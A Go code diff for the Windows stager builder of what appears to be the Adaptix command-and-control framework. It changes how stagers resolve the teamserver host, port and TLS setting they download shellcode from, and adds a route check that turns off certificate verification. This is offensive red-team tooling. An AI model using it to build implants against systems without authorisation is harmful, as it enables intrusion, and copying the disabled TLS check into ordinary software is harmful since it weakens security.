@@ -2,8 +2,10 @@ package main
 
 import (
 	crand "crypto/rand"
+	"crypto/tls"
 	"encoding/hex"
 	"fmt"
+	"io"
 	"net"
 	"net/http"
 	"os"
@@ -43,14 +45,37 @@ var (
 		return "/api"
 	}()
 
+	// The /s/:token route lives on the teamserver's own HTTP endpoint, so the
+	// stager has to be handed that endpoint's port -- not a listener port.
+	// There is deliberately no default here: this used to fall back to 8080,
+	// which in a stock profile is an agent listener, and the stager then spoke
+	// TLS to a plaintext port, died inside HttpSendRequestA and left no
+	// server-side trace whatsoever.  Unset now means "unresolved" (0) and
+	// generation fails with an explanation instead of shipping a dead payload.
 	stagerTSPort = func() int {
 		if v := strings.TrimSpace(os.Getenv("ADAPTIX_TEAMSERVER_PORT")); v != "" {
 			if n, err := strconv.Atoi(v); err == nil && n > 0 {
 				return n
 			}
 		}
-		return 8080
+		return 0
 	}()
+
+	// The Adaptix web endpoint is TLS whenever the profile carries cert/key,
+	// which tls_autogen guarantees, so TLS is the default; an explicit
+	// ADAPTIX_TEAMSERVER_SSL=0 selects a plaintext endpoint.
+	stagerTSSSL = func() bool {
+		switch strings.ToLower(strings.TrimSpace(os.Getenv("ADAPTIX_TEAMSERVER_SSL"))) {
+		case "0", "false", "no", "off":
+			return false
+		}
+		return true
+	}()
+
+	// External address of the teamserver endpoint.  Empty means "reuse the
+	// listener's callback address", which is right when the listener and the
+	// teamserver are the same host -- the usual case.
+	stagerTSHost = strings.TrimSpace(os.Getenv("ADAPTIX_TEAMSERVER_HOST"))
 )
 
 func stagerDir() string {
@@ -230,31 +255,136 @@ func stagerPublish(token string, blob []byte) (string, error) {
 	return stagerHTTPEndpoint + "/s/" + token, nil
 }
 
-func stagerResolveDownloadTarget(listenerMap map[string]any) (host string, port int, useSSL bool, err error) {
-	host = "127.0.0.1"
-	port = stagerTSPort
-	useSSL = true
+func stagerResolveDownloadTarget(listenerMap map[string]any, cfg GenerateConfig) (host string, port int, useSSL bool, err error) {
+	// 取值优先级（三档，与 linux_agent/pl_stager_linux.go 保持**同序**）：
+	//   1. agent_params —— 控制台「生成载荷」表单里填的。**主路径**：所有操作员都在
+	//      WebUI 上操作，这是唯一一处他们能自己改的地方。
+	//   2. 进程环境变量 —— 回退。由 build_deploy.sh --up 按真正加载的 profile 注入，
+	//      老部署方式仍能用。
+	//   3. 监听器的 callback_addresses —— 只兜底 host（监听器与 teamserver 同机时对）。
+	// 全都缺 ⇒ 下面硬报错。绝不再静默回落 8080：那是 agent 监听器。
+	port = cfg.StagerTSPort
+	if port <= 0 {
+		port = stagerTSPort
+	}
+	useSSL = stagerTSSSL
+	if cfg.StagerTSSSL != nil {
+		useSSL = *cfg.StagerTSSSL
+	}
 
-	if lines, ok := listenerMap["callback_addresses"].([]interface{}); ok {
-		for _, iLine := range lines {
-			line, _ := iLine.(string)
-			line = strings.TrimSpace(line)
-			if line == "" {
-				continue
-			}
-			h, _, splitErr := net.SplitHostPort(line)
-			if splitErr != nil {
-				host = line
-			} else if h != "" {
-				host = h
-			}
-			break
-		}
+	host = strings.TrimSpace(cfg.StagerTSHost)
+	if host == "" {
+		host = stagerTSHost
 	}
 	if host == "" {
-		return "", 0, false, fmt.Errorf("cannot resolve stager download host from listener callback_addresses")
+		if lines, ok := listenerMap["callback_addresses"].([]interface{}); ok {
+			for _, iLine := range lines {
+				line, _ := iLine.(string)
+				line = strings.TrimSpace(line)
+				if line == "" {
+					continue
+				}
+				h, _, splitErr := net.SplitHostPort(line)
+				if splitErr != nil {
+					host = line
+				} else if h != "" {
+					host = h
+				}
+				break
+			}
+		}
+	}
+
+	// Both of these used to have silent fallbacks ("127.0.0.1" and 8080) that
+	// produced a URL pointing at an agent listener.  Say what is missing rather
+	// than emitting a payload that can only fail on the target.
+	if port <= 0 {
+		return "", 0, false, fmt.Errorf(
+			"teamserver endpoint port is not configured: fill in the stager download endpoint on the generate form (Stager TS port), or set ADAPTIX_TEAMSERVER_PORT to Teamserver.port from the profile -- the %s route the stager downloads from is served by the teamserver itself, not by the agent listener",
+			stagerHTTPEndpoint+"/s/:token")
+	}
+	if host == "" {
+		return "", 0, false, fmt.Errorf("cannot resolve a stager download host: fill in the stager download endpoint on the generate form (Stager TS host), set ADAPTIX_TEAMSERVER_HOST, or give the listener a callback_address")
 	}
 	return host, port, useSSL, nil
+}
+
+// stagerVerifyRoute asks the teamserver's own endpoint for a token that cannot
+// exist.  stagerServeHandler answers unknown tokens with 404, so a 404 here
+// proves that the port, scheme and endpoint about to be embedded in the stager
+// really do reach this plugin's /s/:token route.  Anything else -- the web UI's
+// SPA fallback comes back 200, a different service answers differently again --
+// is exactly the mismatch that used to ship a stager which died in
+// HttpSendRequestA without ever appearing in any log.
+//
+// The opposite scheme is tried too, on loopback only: if the route answers
+// there, the mistake is ADAPTIX_TEAMSERVER_SSL rather than the port, and saying
+// so beats reporting a bare connection failure.
+//
+// Being unreachable is only a warning: the host given to the stager is its
+// external address, which the teamserver itself may not be able to dial.
+func stagerVerifyRoute(builderId string, host string, port int, useSSL bool) error {
+	schemeOf := func(ssl bool) string {
+		if ssl {
+			return "https"
+		}
+		return "http"
+	}
+	urlPath := stagerHTTPEndpoint + "/s/000000000000000000000000"
+
+	client := &http.Client{
+		Timeout: 3 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+
+	// loopback first, and there both schemes; the advertised host only with the
+	// configured scheme, purely as a reachability fallback.
+	targets := []struct {
+		addr    string
+		schemes []bool
+	}{
+		{net.JoinHostPort("127.0.0.1", strconv.Itoa(port)), []bool{useSSL, !useSSL}},
+		{net.JoinHostPort(host, strconv.Itoa(port)), []bool{useSSL}},
+	}
+
+	connected := false
+	var lastErr error
+	var lastStatus string
+
+	for _, target := range targets {
+		for i, ssl := range target.schemes {
+			url := schemeOf(ssl) + "://" + target.addr + urlPath
+			resp, err := client.Get(url)
+			if err != nil {
+				lastErr = err
+				continue
+			}
+			connected = true
+			_, _ = io.Copy(io.Discard, resp.Body)
+			_ = resp.Body.Close()
+
+			if resp.StatusCode == http.StatusNotFound {
+				if i == 0 {
+					return nil
+				}
+				want := "0"
+				if ssl {
+					want = "1"
+				}
+				return fmt.Errorf("the %s route answers over %s but not over the configured %s: set ADAPTIX_TEAMSERVER_SSL=%s", urlPath, schemeOf(ssl), schemeOf(useSSL), want)
+			}
+			lastStatus = fmt.Sprintf("%s returned HTTP %d", url, resp.StatusCode)
+		}
+	}
+
+	if !connected {
+		_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO,
+			fmt.Sprintf("WARNING: could not verify the stager download URL from this host (%v) -- confirm %s://%s:%d%s is reachable from the target", lastErr, schemeOf(useSSL), host, port, urlPath))
+		return nil
+	}
+	return fmt.Errorf("stager download URL does not reach the /s/:token route (%s); check ADAPTIX_TEAMSERVER_PORT and ADAPTIX_ENDPOINT against the Teamserver section of the profile", lastStatus)
 }
 
 func stagerFindTemplate(moduleDir string) (string, error) {
@@ -271,7 +401,7 @@ func stagerFindTemplate(moduleDir string) (string, error) {
 	return "", fmt.Errorf("stager_win.c not found next to agent plugin (looked under %s/templates)", moduleDir)
 }
 
-func buildWindowsStager(builderId string, moduleDir string, tempDir string, shellcode []byte, listenerMap map[string]any, arch string) ([]byte, string, error) {
+func buildWindowsStager(builderId string, moduleDir string, tempDir string, shellcode []byte, listenerMap map[string]any, arch string, cfg GenerateConfig) ([]byte, string, error) {
 	if len(shellcode) == 0 {
 		return nil, "", fmt.Errorf("empty shellcode for stager")
 	}
@@ -279,8 +409,11 @@ func buildWindowsStager(builderId string, moduleDir string, tempDir string, shel
 		return nil, "", fmt.Errorf("Stager currently supports x64 only")
 	}
 
-	host, port, useSSL, err := stagerResolveDownloadTarget(listenerMap)
+	host, port, useSSL, err := stagerResolveDownloadTarget(listenerMap, cfg)
 	if err != nil {
+		return nil, "", err
+	}
+	if err := stagerVerifyRoute(builderId, host, port, useSSL); err != nil {
 		return nil, "", err
 	}
 
